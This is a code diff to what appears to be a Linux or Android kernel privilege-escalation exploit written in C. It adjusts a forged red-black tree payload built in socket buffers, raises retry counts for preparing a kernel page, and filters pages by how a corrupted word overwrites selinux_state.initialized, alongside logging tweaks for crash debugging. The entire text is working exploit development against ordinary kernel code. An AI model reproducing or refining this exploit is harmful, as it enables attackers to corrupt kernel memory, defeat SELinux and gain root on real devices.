@@ -19,6 +19,13 @@ static long long ms_since(struct timespec *t0) {
          (now.tv_nsec - t0->tv_nsec) / 1000000LL;
 }
 
+/* f2fs rollback drops everything since the last checkpoint, so fsync at
+ * stage boundaries or a panicking run loses its own lines */
+void log_sync(void) {
+  fflush(stdout);
+  fsync(STDOUT_FILENO);
+}
+
 uintptr_t page_base;
 uintptr_t last_mm_struct;
 uintptr_t fake_lock;
@@ -131,8 +138,13 @@ void log_startup_context(void) {
                "Seccomp_filters=%s", values[0], values[1], values[2]);
     }
   }
-  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
-             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
+  struct timespec boot;
+  clock_gettime(CLOCK_BOOTTIME, &boot);
+  double boot_ms = boot.tv_sec * 1000.0 + boot.tv_nsec / 1e6;
+  /* same clock as printk's [timestamp], so a native log line maps onto dmesg */
+  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u boot_ms=%.0f "
+             "attr=%s enforce=%s\n",
+             getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms, attr,
              enforce);
   pr_success("startup limits pid=%d %s\n", getpid(), limits);
   pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
@@ -169,7 +181,7 @@ long sched_setattr_tid(int tid, int nice_value) {
   errno = 0;
   long ret = syscall(274, tid, &attr, 0);
   if (ret != 0) {
-    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
+    pr_warning("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
   }
   return ret;
 }
@@ -381,7 +393,7 @@ int prepare_skb_payload(uintptr_t base) {
       put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
       put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
       put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
-      if (tcp && write_right) {
+      if (write_right) {
         put64(p, W0_OFF + 0x18, write_right);
         put64(p, W0_OFF + 0x20, 0);
         put64(p, W0_OFF + 0x28, pselect_custom_target);
@@ -665,7 +677,7 @@ uintptr_t prepare_kernel_page(void) {
 }
 
 uintptr_t prepare_good_kernel_page(void) {
-  int max_attempts = 4;
+  int max_attempts = 12;
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
   struct timespec deadline = t_good;
@@ -673,9 +685,17 @@ uintptr_t prepare_good_kernel_page(void) {
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page();
     if (base) {
-      pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
-              ms_since(&t_good));
-      return base;
+      /* W1 stores this page address, so the word's byte 2 lands on
+       * selinux_state.initialized. an even byte there fails every SID lookup */
+      if (pselect_custom_write == 1 && pselect_child_node &&
+          ((fake_right >> 16) & 1) == 0) {
+        pr_warning("page %016zx stores an even byte over "
+                   "selinux_state.initialized; taking another\n", (size_t)base);
+      } else {
+        pr_info("prepare_kernel_page ok attempt=%d +%lldms\n", attempt,
+                ms_since(&t_good));
+        return base;
+      }
     }
     struct timespec now;
     clock_gettime(CLOCK_MONOTONIC, &now);
